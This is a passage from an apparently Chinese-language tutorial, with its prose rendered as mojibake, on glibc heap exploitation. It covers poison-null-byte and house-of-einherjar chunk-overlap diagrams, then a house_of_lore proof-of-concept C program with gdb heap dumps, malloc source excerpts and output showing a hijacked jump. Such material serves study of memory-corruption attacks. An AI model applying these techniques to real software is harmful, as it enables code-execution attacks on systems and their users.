|   A   |       B       |   C   |   åˆå§‹çŠ¶æ€
|-------|---------------|-------|
|   A   |       B       |   C   |   é‡Šæ”¾ B
|-------|---------------|-------|
|   A   |       B       |   C   |   æº¢å‡º B çš„ size ä¸º 0x200
|-------|---------------|-------|   ä¹‹åŽçš„ malloc æ“ä½œæ²¡æœ‰æ›´æ–° C çš„ prev_size
         0x100  0x80
|-------|------|-----|--|-------|
|   A   |  B1  | B2  |  |   C   |   malloc(0x180-8), malloc(0x80-8)
|-------|------|-----|--|-------|
|   A   |  B1  | B2  |  |   C   |   é‡Šæ”¾ B1
|-------|------|-----|--|-------|
|   A   |  B1  | B2  |  |   C   |   é‡Šæ”¾ Cï¼ŒC å°†ä¸Ž B1 åˆå¹¶
|-------|------|-----|--|-------|  
|   A   |  B1  | B2  |  |   C   |   malloc(0x180-8)
|-------|------|-----|--|-------|   B2 å°†è¢«è¦†ç›–
        |&lt;å®žé™…å¾—åˆ°çš„å—&gt;|
</code></pre>
<ul>
<li>house of einherjarï¼šä¹Ÿæ˜¯æº¢å‡ºå­—èŠ‚åªèƒ½ä¸º 0 çš„æƒ…å†µï¼Œå½“å®ƒæ˜¯æ›´æ–°æº¢å‡ºå—ä¸‹ä¸€å—çš„ prev_size å­—æ®µï¼Œä½¿å…¶åœ¨è¢«é‡Šæ”¾æ—¶èƒ½å¤Ÿæ‰¾åˆ°ä¹‹å‰ä¸€ä¸ªåˆæ³•çš„è¢«é‡Šæ”¾å—å¹¶ä¸Žå…¶åˆå¹¶ï¼Œé€ æˆå †å—é‡å </li>
</ul>
<pre><code class="language-text">  0x100   0x100   0x101
|-------|-------|-------|
|   A   |   B   |   C   |   åˆå§‹çŠ¶æ€
|-------|-------|-------|
|   A   |   B   |   C   |   é‡Šæ”¾ A
|-------|-------|-------|
|   A   |   B   |   C   |   æº¢å‡º Bï¼Œè¦†ç›– C å—çš„ size ä¸º 0x200ï¼Œå¹¶ä½¿å…¶ prev_size ä¸º 0x200
|-------|-------|-------|
|   A   |   B   |   C   |   é‡Šæ”¾ C
|-------|-------|-------|
|   A   |   B   |   C   |   C å°†ä¸Ž A åˆå¹¶
|-------|-------|-------|   B å—è¢«é‡å 
|&lt;-----å®žé™…å¾—åˆ°çš„å—------&gt;|
</code></pre>
<p>é¦–å…ˆåˆ†é…ä¸‰ä¸ª chunkï¼Œç¬¬ä¸€ä¸ª chunk ç±»åž‹æ— æ‰€è°“ï¼Œä½†åŽä¸¤ä¸ªä¸èƒ½æ˜¯ fast chunkï¼Œå› ä¸º fast chunk åœ¨é‡Šæ”¾åŽä¸ä¼šè¢«åˆå¹¶ã€‚è¿™é‡Œ chunk a ç”¨äºŽåˆ¶é€ å•å­—èŠ‚æº¢å‡ºï¼ŒåŽ»è¦†ç›– chunk b çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œchunk c çš„ä½œç”¨æ˜¯å¸®åŠ©ä¼ªé€  fake chunkã€‚</p>
<p>é¦–å…ˆæ˜¯æº¢å‡ºï¼Œé‚£ä¹ˆå°±éœ€è¦çŸ¥é“ä¸€ä¸ªå †å—å®žé™…å¯ç”¨çš„å†…å­˜å¤§å°ï¼ˆå› ä¸ºç©ºé—´å¤ç”¨ï¼Œå¯èƒ½ä¼šæ¯”åˆ†é…æ—¶è¦å¤§ä¸€ç‚¹ï¼‰ï¼Œç”¨äºŽèŽ·å¾—è¯¥å¤§å°çš„å‡½æ•° <code>malloc_usable_size</code> å¦‚ä¸‹ï¼š</p>
<pre><code class="language-c">/*
   ------------------------- malloc_usable_size -------------------------
 */
static size_t
musable (void *mem)
{
  mchunkptr p;
  if (mem != 0)
    {
      p = mem2chunk (mem);

      [...]
      if (chunk_is_mmapped (p))
        return chunksize (p) - 2 * SIZE_SZ;
      else if (inuse (p))
        return chunksize (p) - SIZE_SZ;
    }
  return 0;
}
/* check for mmap()'ed chunk */
#define chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)
/* extract p's inuse bit */
#define inuse(p)                                  \
  ((((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size) &amp; PREV_INUSE)
/* Get size, ignoring use bits */
#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))
</code></pre>
<p>æ‰€ä»¥ <code>real_a_size = chunksize(a) - 0x8 == 0x18</code>ã€‚å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ç¨‹åºæ˜¯é€šè¿‡ next chunk çš„ <code>PREV_INUSE</code> æ ‡å¿—æ¥åˆ¤æ–­æŸ chunk æ˜¯å¦è¢«ä½¿ç”¨çš„ã€‚</p>
<p>ä¸ºäº†åœ¨ä¿®æ”¹ chunk b çš„ size å­—æ®µåŽï¼Œä¾ç„¶èƒ½é€šè¿‡ unlink çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬éœ€è¦ä¼ªé€ ä¸€ä¸ª c.prev_size å­—æ®µï¼Œå­—æ®µçš„å¤§å°æ˜¯å¾ˆå¥½è®¡ç®—çš„ï¼Œå³ <code>0x100 == (0x111 &amp; 0xff00)</code>ï¼Œæ­£å¥½æ˜¯ NULL å­—èŠ‚æº¢å‡ºåŽçš„å€¼ã€‚ç„¶åŽæŠŠ chunk b é‡Šæ”¾æŽ‰ï¼Œchunk b éšåŽè¢«æ”¾åˆ° unsorted bin ä¸­ï¼Œå¤§å°æ˜¯ 0x110ã€‚æ­¤æ—¶çš„å †å¸ƒå±€å¦‚ä¸‹ï¼š</p>
<pre><code class="language-text">gefâž¤  x/42gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a
0x603010:    0x0000000000000000    0x0000000000000000
0x603020:    0x0000000000000000    0x0000000000000111  &lt;-- chunk b [be freed]
0x603030:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer
0x603040:    0x0000000000000000    0x0000000000000000
0x603050:    0x0000000000000000    0x0000000000000000
0x603060:    0x0000000000000000    0x0000000000000000
0x603070:    0x0000000000000000    0x0000000000000000
0x603080:    0x0000000000000000    0x0000000000000000
0x603090:    0x0000000000000000    0x0000000000000000
0x6030a0:    0x0000000000000000    0x0000000000000000
0x6030b0:    0x0000000000000000    0x0000000000000000
0x6030c0:    0x0000000000000000    0x0000000000000000
0x6030d0:    0x0000000000000000    0x0000000000000000
0x6030e0:    0x0000000000000000    0x0000000000000000
0x6030f0:    0x0000000000000000    0x0000000000000000
0x603100:    0x0000000000000000    0x0000000000000000
0x603110:    0x0000000000000000    0x0000000000000000
0x603120:    0x0000000000000100    0x0000000000000000      &lt;-- fake c.prev_size
0x603130:    0x0000000000000110    0x0000000000000090  &lt;-- chunk c
0x603140:    0x0000000000000000    0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603020, bk=0x603020
 â†’   Chunk(addr=0x603030, size=0x110, flags=PREV_INUSE)
</code></pre>
<p>æœ€å…³é”®çš„ä¸€æ­¥ï¼Œé€šè¿‡æº¢å‡ºæ¼æ´žè¦†å†™ chunk b çš„æ•°æ®ï¼š</p>
<pre><code class="language-text">gefâž¤  x/42gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a
0x603010:    0x0000000000000000    0x0000000000000000
0x603020:    0x0000000000000000    0x0000000000000100  &lt;-- chunk b [be freed]
0x603030:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer
0x603040:    0x0000000000000000    0x0000000000000000
0x603050:    0x0000000000000000    0x0000000000000000
0x603060:    0x0000000000000000    0x0000000000000000
0x603070:    0x0000000000000000    0x0000000000000000
0x603080:    0x0000000000000000    0x0000000000000000
0x603090:    0x0000000000000000    0x0000000000000000
0x6030a0:    0x0000000000000000    0x0000000000000000
0x6030b0:    0x0000000000000000    0x0000000000000000
0x6030c0:    0x0000000000000000    0x0000000000000000
0x6030d0:    0x0000000000000000    0x0000000000000000
0x6030e0:    0x0000000000000000    0x0000000000000000
0x6030f0:    0x0000000000000000    0x0000000000000000
0x603100:    0x0000000000000000    0x0000000000000000
0x603110:    0x0000000000000000    0x0000000000000000
0x603120:    0x0000000000000100    0x0000000000000000      &lt;-- fake c.prev_size
0x603130:    0x0000000000000110    0x0000000000000090  &lt;-- chunk c
0x603140:    0x0000000000000000    0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603020, bk=0x603020
 â†’   Chunk(addr=0x603030, size=0x100, flags=)
</code></pre>
<p>è¿™æ—¶ï¼Œæ ¹æ®æˆ‘ä»¬ä¸Šä¸€ç¯‡æ–‡å­—ä¸­è®²åˆ°çš„è®¡ç®—æ–¹æ³•ï¼š</p>
<ul>
<li><code>chunksize(P) == *((size_t*)(b-0x8)) &amp; (~ 0x7) == 0x100</code></li>
<li><code>prev_size (next_chunk(P)) == *(size_t*)(b-0x10 + 0x100) == 0x100</code></li>
</ul>
<p>å¯ä»¥æˆåŠŸç»•è¿‡æ£€æŸ¥ã€‚å¦å¤– unsorted bin ä¸­çš„ chunk å¤§å°ä¹Ÿå˜æˆäº† 0x100ã€‚</p>
<p>æŽ¥ä¸‹æ¥éšæ„åˆ†é…ä¸¤ä¸ª chunkï¼Œmalloc ä¼šä»Ž unsorted bin ä¸­åˆ’å‡ºåˆé€‚å¤§å°çš„å†…å­˜è¿”å›žç»™ç”¨æˆ·ï¼š</p>
<pre><code class="language-text">gefâž¤  x/42gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a
0x603010:    0x0000000000000000    0x0000000000000000
0x603020:    0x0000000000000000    0x0000000000000091  &lt;-- chunk b1  &lt;-- fake chunk b
0x603030:    0x4141414141414141    0x4141414141414141
0x603040:    0x4141414141414141    0x4141414141414141
0x603050:    0x4141414141414141    0x4141414141414141
0x603060:    0x4141414141414141    0x4141414141414141
0x603070:    0x4141414141414141    0x4141414141414141
0x603080:    0x4141414141414141    0x4141414141414141
0x603090:    0x4141414141414141    0x4141414141414141
0x6030a0:    0x4141414141414141    0x4141414141414141
0x6030b0:    0x0000000000000000    0x0000000000000051  &lt;-- chunk b2  &lt;-- 'victim' chunk
0x6030c0:    0x4141414141414141    0x4141414141414141
0x6030d0:    0x4141414141414141    0x4141414141414141
0x6030e0:    0x4141414141414141    0x4141414141414141
0x6030f0:    0x4141414141414141    0x4141414141414141
0x603100:    0x0000000000000000    0x0000000000000021  &lt;-- unsorted bin
0x603110:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer
0x603120:    0x0000000000000020    0x0000000000000000      &lt;-- fake c.prev_size
0x603130:    0x0000000000000110    0x0000000000000090  &lt;-- chunk c
0x603140:    0x0000000000000000    0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603100, bk=0x603100
 â†’   Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE)
</code></pre>
<p>è¿™é‡Œæœ‰ä¸ªå¾ˆæœ‰è¶£çš„ä¸œè¥¿ï¼Œåˆ†é…å †å—åŽï¼Œå‘ç”Ÿå˜åŒ–çš„æ˜¯ fake c.prev_sizeï¼Œè€Œä¸æ˜¯ c.prev_sizeã€‚æ‰€ä»¥ chunk c ä¾ç„¶è®¤ä¸º chunk b çš„åœ°æ–¹æœ‰ä¸€ä¸ªå¤§å°ä¸º 0x110 çš„ free chunkã€‚ä½†å…¶å®žè¿™ç‰‡å†…å­˜å·²ç»è¢«åˆ†é…ç»™äº† chunk b1ã€‚</p>
<p>æŽ¥ä¸‹æ¥æ˜¯è§è¯å¥‡è¿¹çš„æ—¶åˆ»ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œä¸¤ä¸ªç›¸é‚»çš„ small chunk è¢«é‡Šæ”¾åŽä¼šè¢«åˆå¹¶åœ¨ä¸€èµ·ã€‚é¦–å…ˆé‡Šæ”¾ chunk b1ï¼Œä¼ªé€ å‡º fake chunk b æ˜¯ free chunk çš„æ ·å­ã€‚ç„¶åŽé‡Šæ”¾ chunk cï¼Œè¿™æ—¶ç¨‹åºä¼šå‘çŽ° chunk c çš„å‰ä¸€ä¸ª chunk æ˜¯ä¸€ä¸ª free chunkï¼Œç„¶åŽå°±å°†å®ƒä»¬åˆå¹¶åœ¨äº†ä¸€èµ·ï¼Œå¹¶ä»Ž unsorted bin ä¸­å–å‡ºæ¥åˆå¹¶è¿›äº† top chunkã€‚å¯æ€œçš„ chunk 2 ä½äºŽ chunk b1 å’Œ chunk c ä¹‹é—´ï¼Œè¢«ç›´æŽ¥æ— è§†äº†ï¼ŒçŽ°åœ¨ malloc è®¤ä¸ºè¿™æ•´å—åŒºåŸŸéƒ½æ˜¯æœªåˆ†é…çš„ï¼Œæ–°çš„ top chunk æŒ‡é’ˆå·²ç»è¯´æ˜Žäº†ä¸€åˆ‡ã€‚</p>
<pre><code class="language-text">gefâž¤  x/42gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a
0x603010:    0x0000000000000000    0x0000000000000000
0x603020:    0x0000000000000000    0x0000000000020fe1  &lt;-- top chunk
0x603030:    0x0000000000603100    0x00007ffff7dd1b78
0x603040:    0x4141414141414141    0x4141414141414141
0x603050:    0x4141414141414141    0x4141414141414141
0x603060:    0x4141414141414141    0x4141414141414141
0x603070:    0x4141414141414141    0x4141414141414141
0x603080:    0x4141414141414141    0x4141414141414141
0x603090:    0x4141414141414141    0x4141414141414141
0x6030a0:    0x4141414141414141    0x4141414141414141
0x6030b0:    0x0000000000000090    0x0000000000000050  &lt;-- chunk b2  &lt;-- 'victim' chunk
0x6030c0:    0x4141414141414141    0x4141414141414141
0x6030d0:    0x4141414141414141    0x4141414141414141
0x6030e0:    0x4141414141414141    0x4141414141414141
0x6030f0:    0x4141414141414141    0x4141414141414141
0x603100:    0x0000000000000000    0x0000000000000021  &lt;-- unsorted bin
0x603110:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer
0x603120:    0x0000000000000020    0x0000000000000000
0x603130:    0x0000000000000110    0x0000000000000090
0x603140:    0x0000000000000000    0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603100, bk=0x603100
 â†’   Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE)
</code></pre>
<p>chunk åˆå¹¶çš„è¿‡ç¨‹å¦‚ä¸‹ï¼Œé¦–å…ˆè¯¥ chunk ä¸Žå‰ä¸€ä¸ª chunk åˆå¹¶ï¼Œç„¶åŽæ£€æŸ¥ä¸‹ä¸€ä¸ª chunk æ˜¯å¦ä¸º top chunkï¼Œå¦‚æžœä¸æ˜¯ï¼Œå°†åˆå¹¶åŽçš„ chunk æ”¾å›ž unsorted bin ä¸­ï¼Œå¦åˆ™ï¼Œåˆå¹¶è¿› top chunkï¼š</p>
<pre><code class="language-c">    /* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = p-&gt;prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }

    if (nextchunk != av-&gt;top) {
    /*
  Place the chunk in unsorted chunk list. Chunks are
  not placed into regular bins until after they have
  been given one chance to be used in malloc.
    */
      [...]
    }

    /*
      If the chunk borders the current high end of memory,
      consolidate into top
    */

    else {
      size += nextsize;
      set_head(p, size | PREV_INUSE);
      av-&gt;top = p;
      check_chunk(av, p);
    }
</code></pre>
<p>æŽ¥ä¸‹æ¥ï¼Œç”³è¯·ä¸€å—å¤§ç©ºé—´ï¼Œå¤§åˆ°å¯ä»¥æŠŠ chunk b2 åŒ…å«è¿›æ¥ï¼Œè¿™æ · chunk b2 å°±å®Œå…¨è¢«æˆ‘ä»¬æŽ§åˆ¶äº†ã€‚</p>
<pre><code class="language-text">gefâž¤  x/42gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a
0x603010:    0x0000000000000000    0x0000000000000000
0x603020:    0x0000000000000000    0x0000000000000121  &lt;-- chunk d
0x603030:    0x4242424242424242    0x4242424242424242
0x603040:    0x4242424242424242    0x4242424242424242
0x603050:    0x4242424242424242    0x4242424242424242
0x603060:    0x4242424242424242    0x4242424242424242
0x603070:    0x4242424242424242    0x4242424242424242
0x603080:    0x4242424242424242    0x4242424242424242
0x603090:    0x4242424242424242    0x4242424242424242
0x6030a0:    0x4242424242424242    0x4242424242424242
0x6030b0:    0x4242424242424242    0x4242424242424242  &lt;-- chunk b2  &lt;-- 'victim' chunk
0x6030c0:    0x4242424242424242    0x4242424242424242
0x6030d0:    0x4242424242424242    0x4242424242424242
0x6030e0:    0x4141414141414141    0x4141414141414141
0x6030f0:    0x4141414141414141    0x4141414141414141
0x603100:    0x0000000000000000    0x0000000000000021  &lt;-- small bins
0x603110:    0x00007ffff7dd1b88    0x00007ffff7dd1b88      &lt;-- fd, bk pointer
0x603120:    0x0000000000000020    0x0000000000000000
0x603130:    0x0000000000000110    0x0000000000000090
0x603140:    0x0000000000000000    0x0000000000020ec1  &lt;-- top chunk
gefâž¤  heap bins small
[ Small Bins for arena 'main_arena' ]
[+] small_bins[1]: fw=0x603100, bk=0x603100
 â†’   Chunk(addr=0x603110, size=0x20, flags=PREV_INUSE)
</code></pre>
<p>è¿˜æœ‰ä¸ªäº‹æƒ…å€¼å¾—æ³¨æ„ï¼Œåœ¨åˆ†é… chunk d æ—¶ï¼Œç”±äºŽåœ¨ unsorted bin ä¸­æ²¡æœ‰æ‰¾åˆ°é€‚åˆçš„ chunkï¼Œmalloc å°±å°† unsorted bin ä¸­çš„ chunk éƒ½æ•´ç†å›žå„è‡ªçš„ bins ä¸­äº†ï¼Œè¿™é‡Œå°±æ˜¯ small binsã€‚</p>
<p>æœ€åŽï¼Œç»§ç»­çœ‹ libc-2.26 ä¸Šçš„æƒ…å†µï¼Œè¿˜æ˜¯ä¸€æ ·çš„ï¼Œå¤„ç†å¥½ tchache å°±å¯ä»¥äº†ï¼ŒæŠŠä¸¤ç§å¤§å°çš„ tcache bin éƒ½å æ»¡ã€‚</p>
<p>heap-buffer-overflowï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ŒåŠ äº†å†…å­˜æ£€æµ‹å‚æ•°åŽï¼Œreal size åªèƒ½æ˜¯æ­£å¸¸çš„ 0x10 äº†ã€‚</p>
<pre><code class="language-text">$ gcc -fsanitize=address -g poison_null_byte.c
$ ./a.out
We allocate 0x10 bytes for 'a': 0x60200000eff0
'real' size of 'a': 0x10
b: 0x611000009f00
c: 0x60c00000bf80
=================================================================
==2369==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000009ef8 at pc 0x000000400be0 bp 0x7ffe7826e9a0 sp 0x7ffe7826e990
READ of size 8 at 0x611000009ef8 thread T0
    #0 0x400bdf in main /home/firmy/how2heap/poison_null_byte.c:22
    #1 0x7f47d8fe382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #2 0x400978 in _start (/home/firmy/how2heap/a.out+0x400978)

0x611000009ef8 is located 8 bytes to the left of 256-byte region [0x611000009f00,0x61100000a000)
allocated by thread T0 here:
    #0 0x7f47d9425602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
    #1 0x400af1 in main /home/firmy/how2heap/poison_null_byte.c:15
    #2 0x7f47d8fe382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
</code></pre>
<h3 id="house_of_lore">house_of_lore</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

void jackpot(){ puts(&quot;Nice jump d00d&quot;); exit(0); }

int main() {
    intptr_t *victim = malloc(0x80);
    memset(victim, 'A', 0x80);
    void *p5 = malloc(0x10);
    memset(p5, 'A', 0x10);
    intptr_t *victim_chunk = victim - 2;
    fprintf(stderr, &quot;Allocated the victim (small) chunk: %p\n&quot;, victim);

    intptr_t* stack_buffer_1[4] = {0};
    intptr_t* stack_buffer_2[3] = {0};
    stack_buffer_1[0] = 0;
    stack_buffer_1[2] = victim_chunk;
    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
    fprintf(stderr, &quot;stack_buffer_1: %p\n&quot;, (void*)stack_buffer_1);
    fprintf(stderr, &quot;stack_buffer_2: %p\n\n&quot;, (void*)stack_buffer_2);

    free((void*)victim);
    fprintf(stderr, &quot;Freeing the victim chunk %p, it will be inserted in the unsorted bin\n&quot;, victim);
    fprintf(stderr, &quot;victim-&gt;fd: %p\n&quot;, (void *)victim[0]);
    fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);

    void *p2 = malloc(0x100);
    fprintf(stderr, &quot;Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: %p\n&quot;, p2);
    fprintf(stderr, &quot;The victim chunk %p will be inserted in front of the SmallBin\n&quot;, victim);
    fprintf(stderr, &quot;victim-&gt;fd: %p\n&quot;, (void *)victim[0]);
    fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);

    victim[1] = (intptr_t)stack_buffer_1;
    fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);

    void *p3 = malloc(0x40);
    char *p4 = malloc(0x80);
    memset(p4, 'A', 0x10);
    fprintf(stderr, &quot;This last malloc should return a chunk at the position injected in bin-&gt;bk: %p\n&quot;, p4);
    fprintf(stderr, &quot;The fd pointer of stack_buffer_2 has changed: %p\n\n&quot;, stack_buffer_2[2]);

    intptr_t sc = (intptr_t)jackpot;
    memcpy((p4+40), &amp;sc, 8);
}
$ gcc -g house_of_lore.c
$ ./a.out
Allocated the victim (small) chunk: 0x1b2e010
stack_buffer_1: 0x7ffe5c570350
stack_buffer_2: 0x7ffe5c570330

Freeing the victim chunk 0x1b2e010, it will be inserted in the unsorted bin
victim-&gt;fd: 0x7f239d4c9b78
victim-&gt;bk: 0x7f239d4c9b78

Malloc a chunk that can't be handled by the unsorted bin, nor the SmallBin: 0x1b2e0c0
The victim chunk 0x1b2e010 will be inserted in front of the SmallBin
victim-&gt;fd: 0x7f239d4c9bf8
victim-&gt;bk: 0x7f239d4c9bf8

Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer
This last malloc should return a chunk at the position injected in bin-&gt;bk: 0x7ffe5c570360
The fd pointer of stack_buffer_2 has changed: 0x7f239d4c9bf8

Nice jump d00d
</code></pre>
<p>åœ¨å‰é¢çš„æŠ€æœ¯ä¸­ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“æ€Žæ ·åŽ»ä¼ªé€ ä¸€ä¸ª fake chunkï¼ŒæŽ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦å°è¯•ä¼ªé€ ä¸€æ¡ small bins é“¾ã€‚</p>
<p>é¦–å…ˆåˆ›å»ºä¸¤ä¸ª chunkï¼Œç¬¬ä¸€ä¸ªæ˜¯æˆ‘ä»¬çš„ victim chunkï¼Œè¯·ç¡®ä¿å®ƒæ˜¯ä¸€ä¸ª small chunkï¼Œç¬¬äºŒä¸ªéšæ„ï¼Œåªæ˜¯ä¸ºäº†ç¡®ä¿åœ¨ free æ—¶ victim chunk ä¸ä¼šè¢«åˆå¹¶è¿› top chunk é‡Œã€‚ç„¶åŽï¼Œåœ¨æ ˆä¸Šä¼ªé€ ä¸¤ä¸ª fake chunkï¼Œè®© fake chunk 1 çš„ fd æŒ‡å‘ victim chunkï¼Œbk æŒ‡å‘ fake chunk 2ï¼›fake chunk 2 çš„ fd æŒ‡å‘ fake chunk 1ï¼Œè¿™æ ·ä¸€ä¸ª small bin é“¾å°±å·®ä¸å¤šäº†ï¼š</p>
<pre><code class="language-text">gefâž¤  x/26gx victim-2
0x603000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk
0x603010:    0x4141414141414141    0x4141414141414141
0x603020:    0x4141414141414141    0x4141414141414141
0x603030:    0x4141414141414141    0x4141414141414141
0x603040:    0x4141414141414141    0x4141414141414141
0x603050:    0x4141414141414141    0x4141414141414141
0x603060:    0x4141414141414141    0x4141414141414141
0x603070:    0x4141414141414141    0x4141414141414141
0x603080:    0x4141414141414141    0x4141414141414141
0x603090:    0x0000000000000000    0x0000000000000021  &lt;-- chunk p5
0x6030a0:    0x4141414141414141    0x4141414141414141
0x6030b0:    0x0000000000000000    0x0000000000020f51  &lt;-- top chunk
0x6030c0:    0x0000000000000000    0x0000000000000000
gefâž¤  x/10gx &amp;stack_buffer_2
0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 2
0x7fffffffdc40:    0x00007fffffffdc50    0x0000000000400aed      &lt;-- fd-&gt;fake chunk 1
0x7fffffffdc50:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 1
0x7fffffffdc60:    0x0000000000603000    0x00007fffffffdc30      &lt;-- fd-&gt;victim chunk, bk-&gt;fake chunk 2
0x7fffffffdc70:    0x00007fffffffdd60    0x7c008088c400bc00
</code></pre>
<p>molloc ä¸­å¯¹äºŽ small bin é“¾è¡¨çš„æ£€æŸ¥æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="language-c">          [...]

          else
            {
              bck = victim-&gt;bk;
    if (__glibc_unlikely (bck-&gt;fd != victim))
                {
                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;
                  goto errout;
                }
              set_inuse_bit_at_offset (victim, nb);
              bin-&gt;bk = bck;
              bck-&gt;fd = bin;

              [...]
</code></pre>
<p>å³æ£€æŸ¥ bin ä¸­ç¬¬äºŒå—çš„ bk æŒ‡é’ˆæ˜¯å¦æŒ‡å‘ç¬¬ä¸€å—ï¼Œæ¥å‘çŽ°å¯¹ small bins çš„ç ´åã€‚ä¸ºäº†ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ï¼Œæ‰€ä»¥æ‰éœ€è¦åŒæ—¶ä¼ªé€  bin ä¸­çš„å‰ 2 ä¸ª chunkã€‚</p>
<p>æŽ¥ä¸‹æ¥é‡Šæ”¾æŽ‰ victim chunkï¼Œå®ƒä¼šè¢«æ”¾åˆ° unsoted bin ä¸­ï¼Œä¸” fd/bk å‡æŒ‡å‘ unsorted bin çš„å¤´éƒ¨ï¼š</p>
<pre><code class="language-text">gefâž¤  x/26gx victim-2
0x603000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk [be freed]
0x603010:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer
0x603020:    0x4141414141414141    0x4141414141414141
0x603030:    0x4141414141414141    0x4141414141414141
0x603040:    0x4141414141414141    0x4141414141414141
0x603050:    0x4141414141414141    0x4141414141414141
0x603060:    0x4141414141414141    0x4141414141414141
0x603070:    0x4141414141414141    0x4141414141414141
0x603080:    0x4141414141414141    0x4141414141414141
0x603090:    0x0000000000000090    0x0000000000000020  &lt;-- chunk p5
0x6030a0:    0x4141414141414141    0x4141414141414141
0x6030b0:    0x0000000000000000    0x0000000000020f51  &lt;-- top chunk
0x6030c0:    0x0000000000000000    0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x603000, bk=0x603000
 â†’   Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE)
</code></pre>
<p>è¿™æ—¶ï¼Œç”³è¯·ä¸€å—å¤§çš„ chunkï¼Œåªéœ€è¦å¤§åˆ°è®© malloc åœ¨ unsorted bin ä¸­æ‰¾ä¸åˆ°åˆé€‚çš„å°±å¯ä»¥äº†ã€‚è¿™æ ·åŽŸæœ¬åœ¨ unsorted bin ä¸­çš„ chunkï¼Œä¼šè¢«æ•´ç†å›žå„è‡ªçš„æ‰€å±žçš„ bins ä¸­ï¼Œè¿™é‡Œå°±æ˜¯ small binsï¼š</p>
<pre><code class="language-text">gefâž¤  heap bins small
[ Small Bins for arena 'main_arena' ]
[+] small_bins[8]: fw=0x603000, bk=0x603000
 â†’   Chunk(addr=0x603010, size=0x90, flags=PREV_INUSE)
</code></pre>
<p>æŽ¥ä¸‹æ¥æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œå‡è®¾å­˜åœ¨ä¸€ä¸ªæ¼æ´žï¼Œå¯ä»¥è®©æˆ‘ä»¬ä¿®æ”¹ victim chunk çš„ bk æŒ‡é’ˆã€‚é‚£ä¹ˆå°±ä¿®æ”¹ bk è®©å®ƒæŒ‡å‘æˆ‘ä»¬åœ¨æ ˆä¸Šå¸ƒç½®çš„ fake small binï¼š</p>
<pre><code class="language-text">gefâž¤  x/26gx victim-2
0x603000:    0x0000000000000000    0x0000000000000091  &lt;-- victim chunk [be freed]
0x603010:    0x00007ffff7dd1bf8    0x00007fffffffdc50      &lt;-- bk-&gt;fake chunk 1
0x603020:    0x4141414141414141    0x4141414141414141
0x603030:    0x4141414141414141    0x4141414141414141
0x603040:    0x4141414141414141    0x4141414141414141
0x603050:    0x4141414141414141    0x4141414141414141
0x603060:    0x4141414141414141    0x4141414141414141
0x603070:    0x4141414141414141    0x4141414141414141
0x603080:    0x4141414141414141    0x4141414141414141
0x603090:    0x0000000000000090    0x0000000000000020  &lt;-- chunk p5
0x6030a0:    0x4141414141414141    0x4141414141414141
0x6030b0:    0x0000000000000000    0x0000000000000111  &lt;-- chunk p2
0x6030c0:    0x0000000000000000    0x0000000000000000
gefâž¤  x/10gx &amp;stack_buffer_2
0x7fffffffdc30:    0x0000000000000000    0x0000000000000000  &lt;-- fake chunk 2
